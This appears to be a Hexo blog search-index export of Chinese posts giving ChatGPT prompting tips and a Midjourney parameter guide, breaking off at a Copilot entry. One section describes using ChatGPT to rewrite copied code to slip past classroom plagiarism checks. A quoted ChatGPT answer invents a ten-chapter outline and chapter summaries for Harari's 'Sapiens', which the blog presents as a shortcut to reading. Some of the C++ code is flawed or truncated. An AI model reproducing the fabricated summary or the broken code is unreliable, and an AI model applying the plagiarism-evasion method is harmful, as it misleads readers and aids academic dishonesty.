<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>ChatGPT使用指导</title>
    <url>/2023/02/06/ChatGPT%E4%BD%BF%E7%94%A8%E6%8C%87%E5%AF%BC/</url>
    <content><![CDATA[<p> chatgpt是一个很强大的AI, 本文旨在解决如何提高提问效率, 来更好地让chatgpt解决问题</p>
<h1 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h1><ul>
<li><p>&#96;&#96;&#96;<br>优化[]中的文案, 扩充到500字<br>[我国是一个美丽的国家]</p>
<pre class="line-numbers language-none"><code class="language-none">- 尽量使用英文提问
- 设置简写: &#96;接下来的对话, 如果我发送的内容是 again, 我的意思是 重新回答这一问题&#96;
- **编写代码**
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>用 {编程语言} 实现：{描述需要实现的功能}</p>
<pre class="line-numbers language-none"><code class="language-none">
- 要求越详细越好
- **正则表达式**
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>正则表达式：{描述需要实现的功能}</p>
<pre class="line-numbers language-none"><code class="language-none">
- 例子：
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>  正则表达式：大于0的正整数</p>
  <pre class="line-numbers language-none"><code class="language-none">- **评审代码**
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>Review code and explain in Chinese</p>
<pre class="line-numbers language-none"><code class="language-none">- **检查代码出错原因**
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>Check the cause of the code error and explain in Chinese</p>
<pre class="line-numbers language-none"><code class="language-none">- **重构&#x2F;优化代码**

  - 重构代码
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>  refactor the code</p>
  <pre class="line-numbers language-none"><code class="language-none">- 重构代码，以 vimdiff 格式展示更改的内容，并解释更改的内容
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>  Refactor the code to present the changes in vimdiff format and explain the changes in Chinese</p>
  <pre class="line-numbers language-none"><code class="language-none">- **生成接口文档**
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>Generate markdown API Chinese documentation</p>
<pre class="line-numbers language-none"><code class="language-none">
### 测试

---

- **添加单元测试**
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>Adding unit tests</p>
<pre class="line-numbers language-none"><code class="language-none">- **生成 Mock 数据**
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>Generate data in json format</p>
<pre class="line-numbers language-none"><code class="language-none">
- 例子：
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>  Generate data in json format</p>
<p>  interface AComponent {<br>      id: string;<br>      name: string;<br>      bComponent: BComponent;<br>  }<br>  interface BComponent {<br>      id: string;<br>      name: string;<br>  }</p>
  <pre class="line-numbers language-none"><code class="language-none">
下面举几个例子:

## 编程

我们可以让chatgpt写各种常见不常见的算法题, 只要题目描述足够清楚, chatgpt大概率能够AC
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
</ul>
<p>c++编程题：对于一个长度为 n 的序列 a1,a2,…,an，所有前缀的中位数是多少？<br>第一行一个正整数 t（1≤t≤10），表示数据组数。<br>对于每组数据，第一行一个正奇数 n（1≤n≤100000），含义同题目描述。<br>第二行 n 个整数 a1, a2, …, an（0≤ai≤100000），含义同题目描述。<br>对于每组数据，输出一行 (n + 1)&#x2F;2 个整数，第 i 个数表示长度为 2*i−1 的前缀的中位数。直接给出你的代码</p>
<pre class="line-numbers language-none"><code class="language-none">
下面是chatgpt的答案

&#96;&#96;&#96;cpp
#include &lt;bits&#x2F;stdc++.h&gt;
using namespace std;

const int N &#x3D; 100005;
int n, t, a[N];
multiset&lt;int&gt; s;
multiset&lt;int&gt;::iterator it;

int main() &#123;
    cin &gt;&gt; t;
    while (t--) &#123;
        cin &gt;&gt; n;
        for (int i &#x3D; 0; i &lt; n; i++) &#123;
            cin &gt;&gt; a[i];
            s.insert(a[i]);
            if (i &amp; 1) &#123;
                it &#x3D; s.begin();
                advance(it, (i + 1) &#x2F; 2 - 1);
                cout &lt;&lt; *it &lt;&lt; &quot; &quot;;
            &#125; else &#123;
                it &#x3D; s.begin();
                advance(it, i &#x2F; 2);
                int x &#x3D; *it;
                it &#x3D; s.end();
                advance(it, -i &#x2F; 2 - 1);
                int y &#x3D; *it;
                cout &lt;&lt; (x + y) &#x2F; 2 &lt;&lt; &quot; &quot;;
            &#125;
        &#125;
        cout &lt;&lt; endl;
        s.clear();
    &#125;
    return 0;
&#125;
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="修改代码"><a href="#修改代码" class="headerlink" title="修改代码"></a>修改代码</h2><p>我们在上机的时候, 代码是会查重的<code>&lt;del&gt;</code>如果我们又想抄同学的代码, 又不想被查重<code>&lt;/del&gt;</code>, 就可以让chatgpt修改代码. 需要注意的是, 小打小闹地改变量, for换成while是没用的. 如果代码里有很多函数, 我们可以让chatgpt把函数都写到main函数里, 反之亦然. 如果代码是递归的, 我们可以让chatgpt改成迭代的.</p>
<pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;bits/stdc++.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">N</span> <span class="token expression"><span class="token number">100010</span></span></span>
<span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span>
<span class="token keyword">int</span> t<span class="token punctuation">,</span> n<span class="token punctuation">;</span>
<span class="token keyword">int</span> a<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">int</span> tree<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> N<span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">void</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">int</span> p<span class="token punctuation">,</span> <span class="token keyword">int</span> l<span class="token punctuation">,</span> <span class="token keyword">int</span> r<span class="token punctuation">,</span> <span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>l <span class="token operator">==</span> r<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        tree<span class="token punctuation">[</span>p<span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">int</span> mid <span class="token operator">=</span> <span class="token punctuation">(</span>l <span class="token operator">+</span> r<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>x <span class="token operator">&lt;=</span> mid<span class="token punctuation">)</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">*</span> p<span class="token punctuation">,</span> l<span class="token punctuation">,</span> mid<span class="token punctuation">,</span> x<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">else</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">*</span> p <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> mid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> r<span class="token punctuation">,</span> x<span class="token punctuation">)</span><span class="token punctuation">;</span>
    tree<span class="token punctuation">[</span>p<span class="token punctuation">]</span> <span class="token operator">=</span> tree<span class="token punctuation">[</span><span class="token number">2</span> <span class="token operator">*</span> p<span class="token punctuation">]</span> <span class="token operator">+</span> tree<span class="token punctuation">[</span><span class="token number">2</span> <span class="token operator">*</span> p <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">int</span> <span class="token function">query</span><span class="token punctuation">(</span><span class="token keyword">int</span> p<span class="token punctuation">,</span> <span class="token keyword">int</span> l<span class="token punctuation">,</span> <span class="token keyword">int</span> r<span class="token punctuation">,</span> <span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 查第x大</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>l <span class="token operator">==</span> r<span class="token punctuation">)</span> <span class="token keyword">return</span> l<span class="token punctuation">;</span>
    <span class="token keyword">int</span> mid <span class="token operator">=</span> <span class="token punctuation">(</span>l <span class="token operator">+</span> r<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>x <span class="token operator">&lt;=</span> tree<span class="token punctuation">[</span><span class="token number">2</span> <span class="token operator">*</span> p<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token function">query</span><span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">*</span> p<span class="token punctuation">,</span> l<span class="token punctuation">,</span> mid<span class="token punctuation">,</span> x<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">else</span> <span class="token keyword">return</span> <span class="token function">query</span><span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">*</span> p <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> mid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> r<span class="token punctuation">,</span> x <span class="token operator">-</span> tree<span class="token punctuation">[</span><span class="token number">2</span> <span class="token operator">*</span> p<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>t<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>t<span class="token operator">--</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">memset</span><span class="token punctuation">(</span>tree<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>tree<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token function">add</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">100000</span><span class="token punctuation">,</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">%</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d "</span><span class="token punctuation">,</span> <span class="token function">query</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">100000</span><span class="token punctuation">,</span> i <span class="token operator">/</span> <span class="token number">2</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>我们想把其他代码都写入主函数, 或者把递归改成迭代</p>
<pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// 迭代</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;bits/stdc++.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">N</span> <span class="token expression"><span class="token number">100010</span></span></span>
<span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span>
<span class="token keyword">int</span> t<span class="token punctuation">,</span> n<span class="token punctuation">;</span>
<span class="token keyword">int</span> a<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">int</span> tree<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> N<span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">void</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">int</span> p<span class="token punctuation">,</span> <span class="token keyword">int</span> l<span class="token punctuation">,</span> <span class="token keyword">int</span> r<span class="token punctuation">,</span> <span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
<span class="token keyword">while</span> <span class="token punctuation">(</span>l <span class="token operator">&lt;</span> r<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
<span class="token keyword">int</span> mid <span class="token operator">=</span> <span class="token punctuation">(</span>l <span class="token operator">+</span> r<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span>x <span class="token operator">&lt;=</span> mid<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
r <span class="token operator">=</span> mid<span class="token punctuation">;</span>
p <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">*</span> p<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
l <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
p <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">*</span> p <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
tree<span class="token punctuation">[</span>p<span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
tree<span class="token punctuation">[</span>p<span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">int</span> <span class="token function">query</span><span class="token punctuation">(</span><span class="token keyword">int</span> p<span class="token punctuation">,</span> <span class="token keyword">int</span> l<span class="token punctuation">,</span> <span class="token keyword">int</span> r<span class="token punctuation">,</span> <span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
<span class="token keyword">while</span> <span class="token punctuation">(</span>l <span class="token operator">&lt;</span> r<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
<span class="token keyword">int</span> mid <span class="token operator">=</span> <span class="token punctuation">(</span>l <span class="token operator">+</span> r<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span>x <span class="token operator">&lt;=</span> tree<span class="token punctuation">[</span><span class="token number">2</span> <span class="token operator">*</span> p<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
r <span class="token operator">=</span> mid<span class="token punctuation">;</span>
p <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">*</span> p<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
l <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
x <span class="token operator">-=</span> tree<span class="token punctuation">[</span><span class="token number">2</span> <span class="token operator">*</span> p<span class="token punctuation">]</span><span class="token punctuation">;</span>
p <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">*</span> p <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">return</span> l<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
<span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>t<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">while</span> <span class="token punctuation">(</span>t<span class="token operator">--</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
<span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">memset</span><span class="token punctuation">(</span>tree<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>tree<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
<span class="token function">add</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">100000</span><span class="token punctuation">,</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">%</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d "</span><span class="token punctuation">,</span> <span class="token function">query</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">100000</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h1 id="文案"><a href="#文案" class="headerlink" title="文案"></a>文案</h1><ul>
<li><code>扩写一下这段话，加入一些例子和金句:我国是历史悠久的国家。</code>要求提示越多越好</li>
<li><code>把下面这段话，改写成100字以内的摘要</code></li>
<li><code>校对下面这段话</code></li>
<li>也可以让它检查你英语的语法和用词, 甚至可以让它对你的句子进行修改, 给出更高级地道的表达</li>
<li>翻译: 感觉没有google translate好</li>
</ul>
<h1 id="阅读"><a href="#阅读" class="headerlink" title="阅读"></a>阅读</h1><p>这是一个神奇的功能, 我们可以通过chatgpt来阅读</p>
<p>作为一种在多样化的文本数据集上训练的语言模型，<strong>ChatGPT</strong>能够理解和总结 2021 年之前几乎所有书籍的内容。凭借其先进的自然语言处理能力，<strong>ChatGPT</strong>可以将冗长的作品压缩成易于消化的信息块，提供您可以快速轻松地学习一本书的要点。</p>
<p>这听起来很难理解, 我举一个例子:</p>
<p>比如我想阅读Yuval Noah Harari  的《智人：人类简史》, 该书全面概述了从非洲智人出现到今天的人类历史。但是这本书超过500也, 对注意力愈发缺失的现代人是一个不小的挑战</p>
<p>我们可以对chatgpt输入: <code>列出尤瓦尔·诺亚·哈拉里 (Yuval Noah Harari) 的《智人：人类简史》一书的所有章节</code></p>
<p>Chatgpt</p>
<pre class="line-numbers language-none"><code class="language-none">《智人：人类简史》一共有十章：

起源
智人社会
智人革命
智人帝国
宗教革命
科学革命
工业革命
政治革命
知识革命
现代革命
请注意，本答案的知识截至日期为2021年，可能会存在更新版本。
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>比如我现在对”智人革命”一章感兴趣, 我可以让它展开说说</p>
<p>我:</p>
<pre class="line-numbers language-none"><code class="language-none">深入研究“智人革命”一章并给出较长的内容描述，并提供该章的重点<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>Chatgpt</p>
<pre class="line-numbers language-none"><code class="language-none">“智人革命”一章是《智人：人类简史》中的第三章，是关于智人（Homo sapiens）的起源和发展的重要章节。该章的重点包括：

1.智人的起源：作者在这一章中探讨了智人如何诞生并在非洲蔓延。

2.智人与其他人类物种的区别：作者在这一章中比较了智人与其他人类物种（如尼安德特人和半人猿）的差异，包括智力、语言和文化传承方面的差异。

3.智人的迁徙：作者在这一章中描述了智人如何从非洲迁徙到全球其他地区。

4.智人的文化创新：作者在这一章中探讨了智人如何创造了全新的文化，包括音乐、艺术、宗教和社会制度。

5.智人对环境的影响：作者在这一章中描述了智人对环境的影响，包括对动物种群的影响和对生态系统的影响。

总的来说，“智人革命”一章是一个关于智人起源、发展和影响的全面概述，是该书的重要章节之一。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>比如我对第四点很有兴趣, 我就可以让它讲讲</p>
<p>我: 深入探讨“智人的文化创新”并给出较长的内容描述和要点</p>
<p>chatgpt</p>
<pre class="line-numbers language-none"><code class="language-none">“智人的文化创新”是《智人：人类简史》中“智人革命”一章中的一个重要内容。该内容探讨了智人如何创造了全新的文化。下面是关于“智人的文化创新”的更详细的内容描述和要点：

智人的语言能力：智人的语言能力是其创造文化的关键因素。语言不仅允许智人将想法和信息传递给他人，还允许他们进行抽象思维。

智人的艺术：智人创造了各种形式的艺术，如音乐、绘画、雕塑和剧场。艺术不仅是智人表现自己的情感和思想的方式，还是他们建立起文化传承的重要工具。

智人的宗教：智人创造了各种不同的宗教，包括基督教、伊斯兰教、佛教和犹太教等。宗教不仅是智人对自然界和生活意义的探索，还是他们社会组织的重要因素。

智人的社会制度：智人创造了各种不同的社会制度，如皇权制度、共和制度和民主制度。社会制度不仅决定了智人的社会地位和权力关系，还是他们经济活动的重要框架。

总的来说，“智人的文化创新”一章讲述了智人如何通过语言、艺术、宗教和社会制度等创造了人类文化。这些文化创新是智人不断探索、表现和组织自己的生活的结果，是人类文化发展的重要标志。因此，“智人的文化创新”一章的重点是强调智人的创造力和创新能力。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>除此之外, 如果我们在阅读过程中产生问题, 也可以用chatgpt进行提问</p>
<p>这样，我们就可以更深入地了解本书及其主要论点，而无需花费数小时通读整篇文章。</p>
]]></content>
      <categories>
        <category>AI</category>
      </categories>
      <tags>
        <tag>AI</tag>
      </tags>
  </entry>
  <entry>
    <title>Midjourney AI使用指导</title>
    <url>/2023/02/06/Midjourney%20AI%E4%BD%BF%E7%94%A8%E6%8C%87%E5%AF%BC/</url>
    <content><![CDATA[<p> 通过Midjourney我们可以通过输入文本, 让AI在短短一分钟之内生成图像, 功能非常强大. 我们来了解一下怎么使用它</p>
<p>Sintax: <code>/image ImagePrompts TextPromts Parameters</code></p>
<p>语法非常简单易懂, ImagePrompts就是你想输入的图片的链接地址, 可以有多个, AI会采取你输入的图片的风格; TextPromts就是你的具体描述, 尽量使用更具体的词语</p>
<p>详细介绍一下参数</p>
<ul>
<li><code>--iw</code> 图像权重,可以使用图像权重参数<code>--iw</code>来调整图像 URL 与文本的重要性 ,默认是0.25, 0表示输入图像完全不起作用, 一般5就说明输入图像占很大权重了</li>
<li><code>--ar</code>纵横比</li>
<li><code>--chaos &lt;number 0–100&gt;</code>改变结果的多样性。较高的值会产生更多不寻常和意外的结果</li>
<li><code>--no</code>负面提示，<code>--no plants</code>会尝试从图像中移除植物。</li>
<li><code>--quality &lt;.25, .5, 1, or 2&gt;</code>，您要花费多少渲染质量时间。默认值为 1。值越高成本越高，值越低成本越低。</li>
<li><code>--stop &lt;integer between 10–100&gt;</code>使用<code>--stop</code>参数在流程中途完成作业。以较早的百分比停止作业会产生更模糊、更不详细的结果。</li>
<li><code>--niji</code>另一种模型专注于动漫风格的图像。</li>
<li></li>
</ul>
<h3 id="Focus-on-What-you-Want"><a href="#Focus-on-What-you-Want" class="headerlink" title="Focus on What you Want"></a>Focus on What you Want</h3><p>It is better to describe what you want instead of what you don’t want. If you ask for a party with “no cake,” your image will probably include a cake. If you want to ensure an object is not in the final image, try advance prompting using the <a href="https://docs.midjourney.com/multi-prompts"><code>--no</code> parameter</a>.</p>
<h3 id="Think-About-What-Details-Matter"><a href="#Think-About-What-Details-Matter" class="headerlink" title="Think About What Details Matter"></a>Think About What Details Matter</h3><p>Anything left unsaid may suprise you. Be as specific or vague as you want, but anything you leave out will be randomized. Being vague is a great way to get variety, but you may not get the specific details you want.</p>
<p><strong>Try to be clear about any context or details that are important to you. Think about:</strong></p>
<ul>
<li><strong>Subject:</strong> person, animal, character, location, object, etc.</li>
<li><strong>Medium:</strong> photo, painting, illustration(插图), sculpture(雕塑), doodle(涂鸦), tapestry, etc.</li>
<li><strong>Environment:</strong> indoors, outdoors, on the moon, in Narnia(纳尼亚), underwater, the Emerald City(翡翠城), etc.</li>
<li><strong>Lighting:</strong> soft, ambient, overcast, neon(霓虹灯), studio lights(工作室照明), etc</li>
<li><strong>Color:</strong> vibrant(充满活力), muted, bright, monochromatic单色, colorful, black and white, pastel柔和, etc.</li>
<li><strong>Mood:</strong> Sedate稳重, calm, raucous喧闹, energetic, etc.</li>
<li><strong>Composition:</strong> Portrait, headshot, closeup, birds-eye view, etc.<ul>
<li>​					人像、爆头、特写、鸟瞰图等</li>
</ul>
</li>
</ul>
<h3 id="Use-Collective-Nouns"><a href="#Use-Collective-Nouns" class="headerlink" title="Use Collective Nouns"></a>Use Collective Nouns</h3><p>Plural words leave a lot to chance. Try specific numbers. “Three cats” is more specific than “cats.” Collective nouns also work, “flock of birds” instead of “birds.”</p>
<p><strong>Pick A Medium</strong></p>
<img data-src="/2023/02/06/Midjourney AI使用指导/1.png" style="zoom:120%;">

<p><strong>Get Specific</strong></p>
<img data-src="/2023/02/06/Midjourney AI使用指导/2.png" style="zoom:100%;">

<p><strong>Time Travel</strong></p>
<img data-src="/2023/02/06/Midjourney AI使用指导/3.png" style="zoom:100%;">

<p><strong>Emote</strong></p>
<img data-src="/2023/02/06/Midjourney AI使用指导/4.png" style="zoom:100%;">

<p><strong>Get Colorful</strong></p>
<img data-src="/2023/02/06/Midjourney AI使用指导/5.png" style="zoom:100%;">

<p><strong>Enviromental Exploration</strong></p>
]]></content>
      <categories>
        <category>AI</category>
      </categories>
      <tags>
        <tag>画图</tag>
      </tags>
  </entry>
  <entry>
    <title>copilot使用指导</title>
    <url>/2023/01/31/copilot%E4%BD%BF%E7%94%A8%E6%8C%87%E5%AF%BC/</url>
